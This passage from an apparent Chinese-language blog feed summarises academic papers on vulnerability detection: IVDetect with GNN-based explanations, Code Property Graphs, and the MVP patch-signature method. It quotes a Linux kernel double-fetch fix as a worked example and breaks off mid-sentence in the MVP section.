*arg)</span>&#123;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cros_ec_command</span> <span class="title">u_cmd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cros_ec_command</span> *<span class="title">s_cmd</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;u_cmd, arg, <span class="keyword">sizeof</span>(u_cmd)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> ((u_cmd.outsize &gt; EC_MAX_MSG_BYTES) || (u_cmd.insize &gt; EC_MAX_MSG_BYTES))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">s_cmd = kmalloc(<span class="keyword">sizeof</span>(*s_cmd) + max(u_cmd.outsize, u_cmd.insize), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!s_cmd)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(s_cmd, arg, <span class="keyword">sizeof</span>(*s_cmd) + u_cmd.outsize)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">+   <span class="keyword">if</span> (u_cmd.outsize != s_cmd-&gt;outsize ||u_cmd.insize != s_cmd-&gt;insize) &#123;</span><br><span class="line">+    ret = -EINVAL;</span><br><span class="line">+      <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">+   &#125;</span><br><span class="line">s_cmd-&gt;command += ec-&gt;cmd_offset;</span><br><span class="line">ret = cros_ec_cmd_xfer(ec-&gt;ec_dev, s_cmd);</span><br><span class="line"><span class="comment">/* Only copy data to userland if data was received. */</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">-   <span class="keyword">if</span> (copy_to_user(arg, s_cmd, <span class="keyword">sizeof</span>(*s_cmd) + u_cmd.insize))</span><br><span class="line">+   <span class="keyword">if</span> (copy_to_user(arg, s_cmd, <span class="keyword">sizeof</span>(*s_cmd) + s_cmd-&gt;insize))</span><br><span class="line"> ret = -EFAULT;</span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line"> kfree(s_cmd);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>commit信息显示：At line 6 and line 13, the driver fetches user space data by pointer <code>arg</code> via <code>copy_from_user().</code> The first fetched value (stored in <code>u_cmd</code>) (line6) is used to get the <code>in_size</code> and <code>out_size</code> elements and allocation a buffer (<code>s_cmd</code>) at line 10 so as to copy the whole message to driver later at line 13, which means the copy size of the whole message(<code>s_cmd</code>) is based on the old value (<code>u_cmd.outsize</code>) from the first fetch. Besides, the whole message copied at the second fetch also contains the elements of <code>in_size</code> and <code>out_size</code>, which are the new values. The new values from the second fetch might be changed by another user thread under race condition, which will result in a double-fetch bug when the inconsistent values are used.（内核代码看不太懂，大家见谅，希望有大佬能补充下，大概意思就是可能造成double-fetch，一个fetch就是一次获取用户数据（<code>copy_from_user()</code>））</p><p>修复这个bug需要保证在这两次获取用户输入之间变量<code>u_cmd.outsize</code>和<code>u_cmd.insize</code>不会由于条件竞争而改变。</p><p>针对上述问题，DL-based方法可以将上述函数进行分类（是否包含漏洞），但不能定位到一个具体的行（statement），因此作者在这里用可解释的方法对分类结果进行解释。它会提供一个PDG的子图（几个重要的statement）来解释。</p><p>比如：<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619008.png" alt="在这里插入图片描述"></p><p>针对example代码，框出来的即为可解释方法选出的有问题的代码行。同时，针对没问题的代码，可解释方法也会提供相应的信息。</p><h2 id="三key-ideas-and-architecture-overview">三.Key Ideas and Architecture Overview</h2><p>IVDetect架构如下图所示：<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619001.png" alt="在这里插入图片描述"></p><p>作者用GNNExplainer作为其解释模型，GNNExplainer会选取关键的子图和子特征（比如一个结点特征向量100维，选取其中5维，不过这需要这个特征向量具备好的解释性，比如词袋向量比word2vec好解释）作为解释。</p><ul><li>对于子特征，如果mask掉node的某些特征会对分类结果造成明显影响，那么该这些特征应该包括在解释结果里</li><li>选取子图的选择是，mask掉子图会影响分类结果（有漏洞变没漏洞），子图由一些关键statement和相应控制依赖和数据依赖组成。</li></ul><h3 id="31-representation-learning">3.1 Representation Learning</h3><p>对于PDG结点（一个statement）的向量表示，作者设置了几组向量特征，一个图结点的最终向量表示由这几组拼接而成。</p><ul><li>Sequence of Sub-tokens of a Statement<br>这里将statement转化成sub-token序列，即将某些token再切分为sub-token，和BERT的tokenizer有些类似。这里作者在sub-token序列中只保存变量名（variables），函数名（method names）和类名（class names）。token会根据CamelCase或者Hungarian convention来进行sub-token，并删除单字符sub-token。比如，对于代码<code>if (copy_to_user(arg, s_cmd, sizeof(*s_cmd) + u_cmd.insize))</code>。sub-token序列为<code>copy, to, user, arg, etc</code>。可以看到并没有<code>if,_,(</code>等token。 之后，用glove来<a href="https://so.csdn.net/so/search?q=%E5%90%91%E9%87%8F%E5%8C%96&amp;spm=1001.2101.3001.7020">向量化</a>单个token，并用GRU将整个statement的序列向量化成向量 F 1 F_1F1​。</li><li>Code Structure of a Statement<br>从AST中捕获一个statement的AST子树，并用Tree-LSTM将其向量化为向量 F 2 F_2F2​。</li><li>Variables and Types<br>对于每个node（statement），收集其中的变量名和变量类型。并用和sub-token同样的向量化方式来进行向量化。比如<code>struct cros_ec_command *s_cmd;</code>中变量名<code>s_cmd</code>，类型<code>cros_ec_command</code>。（这块没太看懂，可能要看下代码了）。得到的向量记为 F 3 F_3F3​。</li><li>Surrounding Contexts<br>将跟该statement存在数据依赖和控制依赖的其它结点分别向量化，并用GRU和glove将这些向量统一计算成 F 4 F_4F4​ 和 F 5 F_5F5​（具体操作还得看代码）。</li><li>Attention-based Bidirectional GRU<br>最后，用Bi-GRU + attention模型将上面得到的 F 1 ， F 2 ， . . , F 5 F_1， F_2， … , F_5F1​，F2​，…,F5​ 转化成 最终结点向量（真的太复杂了）。流程如下图所示</li></ul><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619044.png" alt="在这里插入图片描述"></p><h3 id="32-vulnerability-detection-with-fa-gcn">3.2 Vulnerability Detection with FA-GCN</h3><p>下图展示了作者如何用FA-GCN来进行分类任务，FA-GCN在处理稀疏特征以及潜在噪声时非常好用。</p><p>下图中，join layer层之前的操作都是 3.1 中的内容，join layer将所有statement的向量拼成一个矩阵 Feature Matrix。之后就是卷积过程（数学不好没看懂），最终就是通过Classifier分类。<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619063.png" alt="在这里插入图片描述"></p><h3 id="33-graph-based-interpretation-model">3.3 Graph-Based Interpretation Model</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061620149.png" alt="image-20240406162046101"></p><h2 id="四实验目标">四.实验目标</h2><p>作者的目标还挺多了，又分类又解释还要挖掘漏洞pattern。</p><h3 id="41-comparison-on-the-method-level-vulnerability-detection">4.1 Comparison on the Method-Level Vulnerability Detection</h3><p>用IVDetect和其它漏洞分类方法进行比较，有VulDeepecker，SySeVR，Reveal，Devign还有token-based方法。作者这里还使用了AutoML来调参。</p><p>评估指标</p><ul><li>Precision ( P )</li><li>Recall ( R )</li><li>F score ( F )</li><li>Mean Average Precision ( MAP )<br>这个指标需要先理解PR曲线，这里有篇从PR-&gt;MAP都有的<a href="https://blog.csdn.net/xys430381_1/article/details/90770520?ops_request_misc=%7B%22request%5Fid%22%3A%22162643753116780269846149%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=162643753116780269846149&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-12-90770520.pc_search_result_cache&amp;utm_term=MAP+%E6%8C%87%E6%A0%87&amp;spm=1018.2226.3001.4187">讲解</a>。</li><li>Normalized DCG<br>貌似是推荐系统用的指标，不是很清楚</li><li>First Ranking ( FR )<br>我也没太看懂这个是用来衡量什么的</li><li>Accuracy under curve ( AUC )<br>AUC曲线，可以参考<a href="https://blog.csdn.net/liweibin1994/article/details/79462554?ops_request_misc=%7B%22request%5Fid%22%3A%22162643810616780255247871%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=162643810616780255247871&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-79462554.pc_search_result_cache&amp;utm_term=AUC&amp;spm=1018.2226.3001.4187">这篇</a></li></ul><h3 id="42-comparison-with-other-interpretation-models-for-fine-grained-vd-interpretation">4.2 Comparison with other Interpretation Models for Fine-grained VD Interpretation</h3><p>这里作者拿GNNExplainer和其它解释方法进行了对比，对比的方法有</p><ul><li>ATT<br>用来衡量边的重要性的Graph attention机制</li><li>Grad<br>基于梯度的方法</li></ul><p>因为解释方法的对比需要有定位到漏洞行号的数据集，因此只有Fan数据集可以使用，其它两个只有哪些方法有漏洞的信息，并没有fix。这里，作者用在Reveal和FFMPeg+Qemu数据集上训练的FA-GCN模型来对Fan数据集分类。</p><p>对于错误分类（标签1，预测0）的作者不考虑进行解释。而同时，由于标签0的函数没有fix信息，解释出来也没法评估，所以作者只考虑标签1预测1的（TPR）。</p><p>Evaluation Metrics：</p><p>对于一个解释子图 G M G_MGM。S SS 为从vulnerable版本的代码中删除和修改的statement的集合。修改的目的是修复漏洞。如果 S ∈ G M S \in G_MS∈GM，那么解释结果算正确，否则错误。也就是所有的vul statement都要包括才行。</p><p>对于fixed版本，S ′ S^{’}S′ 为添加的statement的集合。而此时 G M G_MGM 包含任意一个 S ′ S^{’}S′ 中的statement，就算正确，否则失误。</p><p>作者还用了Mean First Ranking (MFR)和 Mean Average Ranking (MAR)来评估解释结果，不过没太看懂这两个指标。</p><p>需要注意的是作者并没有用fidelity和sparsity这2个指标，也许不符合人的直觉吧。</p><h3 id="43-vulnerable-code-patterns-and-fixing-patterns">4.3 Vulnerable Code Patterns and Fixing Patterns</h3><p>对于用GNNExplainer产生的一系列解释子图，作者用挖掘算法从这些子图中挖掘出漏洞pattern以及从fixed版本中挖掘fix pattern。这里并没有客观评价指标。</p><h3 id="44-sensitivity-analysis-for-internal-features">4.4 Sensitivity Analysis for Internal Features</h3><p>作者在前面提到了对于图结点向量表示用了4种特征（token sequence, AST, type, 控制依赖和数据依赖算一种）。这里作者从只用其中一个特征（token）对statement向量化开始，一步一步添加特征，评估不同特征对结果的影响。</p><p>评估指标和4.1相同。</p><h3 id="45-sensitivity-analysis-on-training-data">4.5 Sensitivity Analysis on Training Data</h3><p>分别用(80%, 10%,10%), (70%, 15%, 15%), (60%, 20%, 20%)和(50%, 25%, 25%)的(training, tuning, testing)数据集划分比率来研究效果。</p><h3 id="46-time-complexity">4.6 Time Complexity</h3><p>评估实际训练和测试用时。</p><h2 id="五实验结果">五.实验结果</h2><h3 id="51-comparison-on-the-method-level-vulnerability-detection">5.1 Comparison on the Method-Level Vulnerability Detection</h3><p>这里作者做的对比实验还挺多的，并且分别在FFMPeg+Qemu，Fan，Reveal数据集上分别测试的。</p><p>先看看precision, recall, F1 3个指标<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619015.png" alt="在这里插入图片描述"></p><p>其它指标</p><p>FFMPeg+Qemu数据集<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619035.png" alt="在这里插入图片描述"><br>Fan数据集<br><img src="https://img-blog.csdnimg.cn/20210717150915119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MzcwNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Reveal数据集<br><img src="https://img-blog.csdnimg.cn/20210717150932483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MzcwNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="52-comparison-with-other-interpretation-models-for-fine-grained-vd-interpretation">5.2 Comparison with other Interpretation Models for Fine-grained VD Interpretation</h3><p>作者对比了3种解释方法的效果（GNNExplainer, Graph Attention, Grad）。用到的指标上面也提到了，accuracy是与分类的类似（correct or incorrect。correct定义上面说过）</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619519.png" alt="在这里插入图片描述"></p><h3 id="53-vulnerable-code-pattern-analysis">5.3 Vulnerable Code Pattern Analysis</h3><p>作者从前面的解释任务中收集了700+解释子图。作者先用与VulDeepecker和SySeVR相似的符号化（把变量名用VAR替代等待）方式预处理解释子图，然后用下面参考文献1提到的子图pattern挖掘算法配上不同的size限制来挖掘不同大小的子图pattern。</p><p>作者在此进行人工验证。不过没评估好坏，只是数个数。</p><p><img src="https://img-blog.csdnimg.cn/20210717152227969.png" alt="在这里插入图片描述"><br>作者还贴上了2个example</p><p>下图展现了2个不同的漏洞pattern。第一个属于api误用，包括<code>is_link,exit,cop_file</code>，第二个调用了<code>udf_get_filename</code>这个有漏洞的函数，这个漏洞可以通过添加第5个参数得到修复。<br><img src="https://img-blog.csdnimg.cn/20210717152339673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MzcwNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下图则是fixing pattern。第一个是为了修复多线程下数据加锁类问题，可以看到修复方式就是加锁。第二个图是为了修复一个缓冲区溢出漏洞。<br><img src="https://img-blog.csdnimg.cn/20210717152359704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MzcwNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="54-sensitivity-analysis-for-features">5.4 Sensitivity Analysis for Features</h3><p>下表展示了不同特征对漏洞分类的效果影响。涉及名词有</p><ul><li>sequence of sub-tokens (SST)</li><li>sequence of tokens (ST)</li><li>control dependency（CD）</li><li>data dependency（DD）<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619883.png" alt="在这里插入图片描述"></li></ul><p>可以看到作者对比的特征是ST，ST+SST，ST+SST+AST等等。逐级递增，但并没有单独测试AST,VAR等等。</p><h3 id="55-sensitivity-analysis-on-training-data">5.5 Sensitivity Analysis on Training Data</h3><p>数据集切分方式的影响<br><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404061619877.png" alt="在这里插入图片描述"></p><h2 id="六参考文献">六.参考文献</h2><blockquote><p>[<a href="https://dl.acm.org/doi/10.1145/1595696.1595767">1] Tung Thanh Nguyen, Hoan Anh Nguyen, Nam H. Pham, Jafar M. Al-Kofahi, and Tien N. Nguyen. 2009. Graph-Based Mining of Multiple Object Usage Patterns.</a><br>[<a href="https://arxiv.org/abs/2106.10478">2] Li Y , Wang S , Nguyen T N . Vulnerability Detection with Fine-grained Interpretations. 2021.</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Modeling and Discovering Vulnerabilities with Code Property Graphs</title>
      <link href="/2023/12/18/Papers/Vul/Modeling%20and%20Discovering%20Vulnerabilities%20with%20Code%20Property%20Graphs/"/>
      <url>/2023/12/18/Papers/Vul/Modeling%20and%20Discovering%20Vulnerabilities%20with%20Code%20Property%20Graphs/</url>
      
        <content type="html"><![CDATA[<h2 id="modeling-and-discovering-vulnerabilities-with-code-property-graphsspa-2014-fabian-yamaguchi-et-al">Modeling and Discovering Vulnerabilities with Code Property Graphs：S&amp;P(A) 2014, Fabian Yamaguchi et al.</h2><h3 id="abstract">Abstract</h3><p>本文提出了一种基于代码属性图CPG的源代码漏洞检测方法。代码属性图是包括抽象语法树AST、控制流图CFG和程序依赖图PDG的一个联合数据结构。本文通过图的遍历（graph traversals）来进行漏洞检测，检测的漏洞类别包括缓冲区溢出（buffer overflows），整数溢出（integer overflows），内存泄漏（memory disclosures），格式化字符串漏洞（format string vulnerabilities）。本文使用一个图数据库来实现该方案，并在Linux内核源代码中识别了18个以前未知的漏洞，证明了该方案的有效性。</p><h3 id="introduction">Introduction</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148238.jpeg" alt="img"></p><p>以上图为示例代码，介绍一下AST、CFG、PDG的含义。</p><ul><li>AST</li></ul><p>AST的全名为抽象语法树，是代码解析器或者编译器产生的一种代码的中间表示形式，是很多其它代码表示基础。AST非叶子节点表示运算或赋值操作，叶子节点表示常量或标识符，表达了代码的表达式和语句嵌套生成程序的方式。AST蕴含着丰富的代码语法信息，但缺乏控制流和数据依赖等信息，示例代码的AST如下图(a)所示。</p><ul><li>CFG</li></ul><p>CFG的全名为控制流图，表示了每条代码语句的执行顺序以及需要满足的条件分支，CFG的每个结点表示1条代码语句，结点之间通过有向边连接表示执行的顺序和分支。AST可以经过2个步骤变成CFG：首先用if, while, for等控制语句建立初步的CFG，然后用goto，break等语句来对CFG图进行修正。CFG可以用在许多安全应用上，比如检测已知恶意代码的变种以及指导模糊测试的工具，示例代码的CFG如下图(b)所示。</p><ul><li>PDG</li></ul><p>PDG的全名为程序依赖图，最初用于程序切片任务中，PDG同时包含数据依赖和控制依赖，数据依赖指的是变量的使用语句与变量的定义或赋值语句存在数据依赖；控制依赖指的是一条语句的执行与否依赖于另一条语句执行的结果，则称这两条语句控制依赖。示例代码的PDG如下图©所示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148300.jpeg" alt="img"></p><p>上文所述每种程序表示（AST，CFG，PDG）都是从不同的角度表示程序，而CPG就是要结合这几种表示，属性图在许多图数据库（ArangoDB，Neo4J，OrientDB）中是结构化数据的基础表示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148279.jpeg" alt="img"></p><p>一个简单的属性图如上图所示，每个节点的属性key均为k，而属性value有x和w两个值，获取属性图的特征信息的主要方式是graph traversals（图的遍历）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148241.jpeg" alt="img"></p><p>图的遍历有以上3种方式，分别是获取邻接节点，获取类别为l的边的可达节点，以及获取类别为l的边且属性为k和s的可达节点。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148245.jpeg" alt="img"></p><p>上图就是一个CFG的完整实例，其中包括AST,CFG,PDG的边，包含语法和语义信息，控制依赖和数据依赖</p><ul><li>与AST对比，整个函数的AST被切分成4个语句的AST，并用CFG和PDG的边串起</li><li>与CFG对比，每个语句用它的AST来表示而不仅仅是token序列，并且多了PDG的边</li><li>与PDG对比,  每个语句用它的AST来表示而不仅仅是token序列，并且多了CFG的边</li></ul><p>本文的贡献点：</p><ul><li>CPG：一种结合了AST,CFG,PDG三种程序表示的综合图表示</li><li>CPG遍历检测漏洞：常见类型的漏洞可以被建模为代码属性图的遍历，并生成有效的漏洞检测模板</li><li>高效执行：将CPG导入到图数据库中后，可以高效的处理大型代码库</li></ul><h3 id="method">Method</h3><p>下面，使用下图的C代码举例，展示本文是如何通过CPG图的遍历来检测4种代码漏洞的。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148251.jpeg" alt="img"></p><p>channelp-&gt;exit_signal =LIBSSH2_ALLOC(session, namelen +1);这行代码种namelen是用户输入的变量，所以可能会导致漏洞，本文从以下几个方面分析漏洞：</p><ul><li>Sensitive operations：敏感操作包括调用受保护的函数，缓冲区复制数据，比如示例中的算数表达式就需要特别关注，需要检查AST</li><li>Type usage：同时变量类型也需要进行关注，如果namelen是16位而不是32位变量就不会出现漏洞，该类型也需要检查AST</li><li>Attacker control：检测哪些data source处于用户控制之下很重要，这个示例中，_libssh2_ntohu32的返回值就是用户可控的，可以借助PDG中的数据依赖来建模</li><li>Sanitization：许多程序由于缺乏数据校验而导致漏洞，在示例中，如果对namelen进行校验，确保它的值在合适范围内，那么漏洞不会发生，此时需要检查CFG</li></ul><p>下面以3种漏洞为例，介绍分析代码属性图提供的不同视图如何有助于构建成功的图遍历以发现漏洞。</p><ol><li>Syntax-Only Vulnerability：在CPG中，语句内部的问题可以通过AST解决，而语句之间的依赖关系则需要CFG和PDG来处理。AST层面主要有如下问题：</li></ol><ul><li><p>Insecure arguments：不安全的参数，主要出自函数调用参数，比如格式化字符串漏洞(printf)，其中格式化字符串的一个必须满足的条件就是传递的第一个参数不是常量（比如%s）。</p></li><li><p>Integer overflows：整数溢出常常发生在内存分配（malloc）的算术运算中（+，*），比如LIBSSH2_ALLOC (session, namelen + 1);的第二个参数。所以在遍历AST时需重点访问malloc类函数调用中的算术运算结点。</p></li><li><p>Integer type issues：问题主要出现在赋值操作中，左边的数据类型宽度要小于右边的宽度（比如左边short，右边int），这在遍历AST的时候可能分别需要遍历赋值运算符的左右子树。</p></li><li><p>Control-Flow Vulnerability：引入CFG可以对更多的漏洞类型建模，通过使用代码属性图的控制流边，可以建模语句的执行顺序，从而可以访问更大范围的漏洞，比如：</p></li><li><p>Resource leaks：当资源被分配（allocate）但并没有被释放的时候，会导致系统爆内存，进而使得无法被外部访问。在CFG中，从分配内存空间的函数调用（malloc）开始，到释放这个指针的函数（free）构成一个路径，如果只有malloc没有free，则说明出现了内存泄露。</p></li><li><p>Failure to release locks：虽然在一般情况下并发问题很难检测到，但可以使用简单的控制流分析来检测在错误路径上没有释放锁的情况。</p></li><li><p>Use-after-free vulnerabilities：内存被释放后没有置为NULL，导致可能被再次利用，简单的控制流分析就足以在一个函数中识别这类漏洞。</p></li><li><p>Taint-Style Vulnerability：结合语法、控制和数据流信息对漏洞进行建模，与只使用语法和控制流的漏洞分析相比，加上PDG可以使用数据流边建模额外的代码漏洞，比如：</p></li><li><p>Buffer overflow vulnerabilities：缓冲区溢出漏洞大多由没有对输入数据进行校验导致，在许多linux内核代码中，当系统从get_user读取外部输入数据作为第3个参数传递给copy_from_user或者memcpy函数时会触发该漏洞。所以遍历的时候需要检查get_user的第一个参数和copy_from_user(memcpy)的第3个参数。</p></li><li><p>Code injection vulnerabilities：在C语言中，注入类漏洞通常在CPG中存在从recv第2个参数到system第1个参数的路径，并且中间没有对字符串进行校验和检查。</p></li><li><p>Missing permission checks：web应用程序和内核代码通常都需要在执行操作之前检查用户权限，这类漏洞没有对用户可控数据进行检查，确保他们有足够的权限。</p></li></ul><h3 id="experiment">Experiment</h3><p>为了进行评估，我们基于代码属性图的遍历过程实现了一个静态代码漏洞检测系统。针对不同的漏洞类型使用不同的代码表示来处理，如下图所示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148630.jpeg" alt="img"></p><p>本文使用对CPG图遍历的方式在Linux内核源代码中识别了18个以前未知的漏洞，证明了该方案的有效性。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403291148698.jpeg" alt="img"></p><h3 id="conclusion">Conclusion</h3><p>本文提出了一种基于代码属性图CPG的源代码漏洞检测方法，基于一种新颖的源代码表示形式，即代码属性图CPG，通过对图的遍历来对常见漏洞进行建模于检测。使用CPG图遍历的方式，本文对缓冲区溢出、格式字符串漏洞和内存地址泄漏等漏洞进行了建模与分析检测。此外，本文还审计了一个Linux内核代码库，并在源代码中确定了18个以前未知的漏洞，这些漏洞由供应商确认并修复。</p>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Detecting Vulnerabilities using Patch-Enhanced Vulnerability Signatures</title>
      <link href="/2023/12/18/Papers/Vul/MVP/"/>
      <url>/2023/12/18/Papers/Vul/MVP/</url>
      
        <content type="html"><![CDATA[<h3 id="paper">Paper</h3><p>MVP: Detecting Vulnerabilities using Patch-Enhanced Vulnerability Signatures：USENIX 2020，Yang Xiao et al.</p><h3 id="abstract">Abstract</h3><p>重复漏洞（Recurring Vulnerability）广泛存在于真实的系统中，这些漏洞通常由可重用的代码库或共享的代码逻辑导致，因此同样的漏洞很可能在其他地方也存在而未被发现。本文提出了一种新的方法<strong>MVP</strong>来检测具有低假阳性和低假阴性的重复漏洞，首先利用新的程序切片技术从漏洞函数及其补丁函数中提取漏洞和补丁的语法和语义特征。如果目标函数匹配漏洞特征，但不匹配补丁特征，则该目标函数会被识别为存在漏洞。</p><p>本文在10个开源系统上对MVP方法进行实验，结果表明，MVP显著优于目前的基于克隆和基于功能匹配的重复漏洞检测的SOTA方法；MVP检测到了通用的漏洞检测方法无法检测到的重复漏洞；MVP检测到97个新的漏洞，并获得了23个CVE认证。</p><h3 id="introduction">Introduction</h3><p>由于软件系统中代码库的重用或代码逻辑的共享(对不同用途的相似对象使用相似的处理逻辑)，使得具有相似特征的重复漏洞广泛存在，但在现实程序中却无法检测到，因此，重复漏洞检测得到了广泛的普及。本文的目的就是检测重复出现的漏洞，也即给定一个在程序中以一种特定的方式运行的漏洞，检测其他程序是否可能存在这种同样形式的漏洞。</p><p>现有的检测重复漏洞的方法可以分为两种：</p><ul><li>一种是基于代码克隆的方法，该方法将重复漏洞的检测问题视为代码克隆的检测问题，从已知的漏洞中提取token或语法级的signature，并将该signature的克隆代码视作漏洞。</li><li>另一种是基于函数匹配的方法，该方法不考虑任何漏洞特征，直接将已知的漏洞函数作为signature，检测是否存在这些signature的克隆函数。</li></ul><p>该领域目前存在的两个主要挑战是如何区分已经修补完成的漏洞，减少假阳性率；以及如何精确的生成一个已知漏洞的signature，来减少假阳性和假阴性。</p><p>本文提出了一个针对重复漏洞的漏洞检测方法MVP，<strong>为了解决第一个挑战，MVP不仅生成漏洞的signature，还同时生成补丁的signature</strong>。利用漏洞特征来检测可能存在的漏洞，并利用补丁特征来区分这些漏洞是否已经打过补丁。<strong>为了解决第二个挑战，我们提出了一种新的切片方法，只提取与漏洞和补丁相关的语句，在语法和语义级别生成更加精确的漏洞和补丁的signature</strong>。此外，我们采用语句抽象和基于熵的语句选择来进一步提高MVP的准确性。</p><p>本文在10个C/C++开源项目上对MVP方法进行了实验，发现了97个尚未被发现的安全漏洞，并获得了23个CVE认证。同时，将MVP与四种现有的SOTA方法进行比较，发现MVP在准确率上明显更胜一筹。</p><h3 id="motivation">Motivation</h3><p>本文在10个项目的34019对漏洞和补丁函数上进行了实验，使用SourcerCC同一对漏洞函数和补丁函数的相似度，发现有91.3%的样本对二者相似度均超过了70%，而实验证明有35.1%的真实漏洞目标函数与原漏洞函数的相似度小于70%，所以很难通过仅仅计算目标函数与漏洞函数的相似度来判断是否有漏洞，还要计算目标函数与补丁函数的相似度来综合判断。</p><h3 id="method">Method</h3><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958816.jpeg" alt="img"></p><p>上图是本文MVP模型的Framework架构图，一个以函数为检测粒度的重复漏洞检测框架，主要包含以下3个步骤：(以下用“sig”代指“signature”)</p><ul><li>生成目标函数的sig：输入待检测的目标系统，为系统中的每个目标函数生成sig。</li><li>生成漏洞代码和补丁代码的sig：输入安全补丁程序，生成漏洞和补丁的sig，从漏洞产生和漏洞修复的角度反映漏洞，得到一个具有众多漏洞和补丁sig的待匹配集合。</li><li>将目标系统中的每个函数的sig与漏洞和补丁sig进行匹配：如果在待匹配集合中发现了与目标函数sig相匹配的漏洞sig，但不存在相匹配的补丁sig，则认为目标函数存在重复漏洞。</li></ul><p>接下来进行详细解读。</p><p>首先，定义函数签名，给定一个C/C++函数f，将f的签名定义为一个元组(fsyn，fsem)，其中fsyn是函数中所有语句的哈希值的集合；fsem是由一系列3元组(h1，h2，type)构成的集合，h1和h2表示任意两个语句的哈希值，type ∈\in\in {data，control}表示哈希值为h1的语句和哈希值为h2的语句具有数据依赖或控制依赖关系。<strong>fsyn捕获目标函数的语句作为语法签名；fsem捕获目标函数语句之间的数据依赖和控制依赖关系，作为语义签名</strong>。二者提供了一个函数的补充信息，以帮助提高匹配精度。</p><p>其次，使用(fv,pv)来代表一对漏洞函数和对应的补丁函数。给定一对(fv,pv)，函数Patch Pv由一个或多个hunk（块）组成。hunk是Patch中的一个基本单元，它由上下文行、已删除的代码行和已添加的代码行组成。删除的行在fv中，但不再pv中；添加的行不在fv中，但在pv中。</p><ul><li><strong>生成目标函数的signature</strong></li></ul><p>该过程有3个步骤，首先是parsing过程，使用Joern来parse代码生成代码属性图（一个AST、PDG、CFG联合的数据结构），以获取目标系统的所有函数，对每个目标函数生成AST和PDG。然后对函数做规范化处理，对形参、局部变量和字符串常量替换为同一形式，删除所有注释、大括号、tab、空白。</p><p>最后，进行函数签名的生成，首先对规范化后的函数中的每个语句计算hash值，得到fsyn。接着从函数的PDG中提取两个语句之间的数据和控制依赖关系，每一组关系表示成一个三元组的形式(h1，h2，type)，下图展示了一个从原始目标函数到生成sig的完整过程。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403290958827.jpeg" alt="img"></p><ul><li><strong>生成漏洞代码和补丁代码的signature</strong></li></ul><p>给定一对(fv,pv)和Patch 